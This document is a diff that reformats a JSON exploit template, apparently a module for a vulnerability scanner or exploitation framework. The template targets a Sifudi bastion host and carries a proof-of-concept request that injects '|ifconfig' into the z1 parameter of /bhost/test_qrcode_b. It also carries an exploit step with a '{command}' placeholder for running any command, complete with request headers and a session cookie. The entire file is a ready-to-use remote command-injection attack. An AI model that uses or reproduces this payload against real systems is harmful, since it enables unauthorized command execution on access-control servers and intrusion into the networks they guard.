@@ -1,53 +1,1 @@
-{
-  "name":"思福迪堡垒机命令执行",
-  "tag":"sifudi",
-  "type":"exec",
-  "poc": {
-    "pocGet": "/bhost/test_qrcode_b",
-    "pocPost": "z1=\"|ifconfig\"&z2=1&z3=1",
-    "header": {
-      "Connection": "close",
-      "Content-Length": "24",
-      "sec-ch-ua": "Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
-      "Accept": "*/*",
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "X-Requested-With": "XMLHttpRequest",
-      "sec-ch-ua-mobile": "?0",
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-      "sec-ch-ua-platform": "Windows",
-      "Sec-Fetch-Site": "same-origin",
-      "Sec-Fetch-Mode": "cors",
-      "Sec-Fetch-Dest": "empty",
-      "Accept-Encoding": "gzip, deflate",
-      "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
-      "Cookie": "bhost=021EAC95F56C70725FBE8C3B436D25C4",
-      "Referer": "{url}"
-    },
-    "Pattern": "(addr)"
-  },
-  "exp": {
-    "step1": {
-      "expGet": "/bhost/test_qrcode_b",
-      "expPost": "z1=\"|{command}\"&z2=1&z3=1",
-      "header": {
-        "Connection": "close",
-        "Content-Length": "24",
-        "sec-ch-ua": "Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
-        "Accept": "*/*",
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-Requested-With": "XMLHttpRequest",
-        "sec-ch-ua-mobile": "?0",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-        "sec-ch-ua-platform": "Windows",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Accept-Encoding": "gzip, deflate",
-        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
-        "Cookie": "bhost=021EAC95F56C70725FBE8C3B436D25C4",
-        "Referer": "{url}"
-      },
-      "Pattern": "(.*)"
-    }
-  }
-}
+{  "name":"思福迪堡垒机命令执行",  "tag":"sifudi",  "type":"exec",  "poc": {    "pocGet": "/bhost/test_qrcode_b",    "pocPost": "z1=\"|ifconfig\"&z2=1&z3=1",    "header": {      "Connection": "close",      "Content-Length": "24",      "sec-ch-ua": "Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",      "Accept": "*/*",      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",      "X-Requested-With": "XMLHttpRequest",      "sec-ch-ua-mobile": "?0",      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",      "sec-ch-ua-platform": "Windows",      "Sec-Fetch-Site": "same-origin",      "Sec-Fetch-Mode": "cors",      "Sec-Fetch-Dest": "empty",      "Accept-Encoding": "gzip, deflate",      "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",      "Cookie": "bhost=021EAC95F56C70725FBE8C3B436D25C4",      "Referer": "{url}"    },    "Pattern": "(addr)"  },  "exp": {    "step1": {      "expGet": "/bhost/test_qrcode_b",      "expPost": "z1=\"|{command}\"&z2=1&z3=1",      "header": {        "Connection": "close",        "Content-Length": "24",        "sec-ch-ua": "Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",        "Accept": "*/*",        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",        "X-Requested-With": "XMLHttpRequest",        "sec-ch-ua-mobile": "?0",        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        "sec-ch-ua-platform": "Windows",        "Sec-Fetch-Site": "same-origin",        "Sec-Fetch-Mode": "cors",        "Sec-Fetch-Dest": "empty",        "Accept-Encoding": "gzip, deflate",        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",        "Cookie": "bhost=021EAC95F56C70725FBE8C3B436D25C4",        "Referer": "{url}"      },      "Pattern": "(.*)"    }  }}
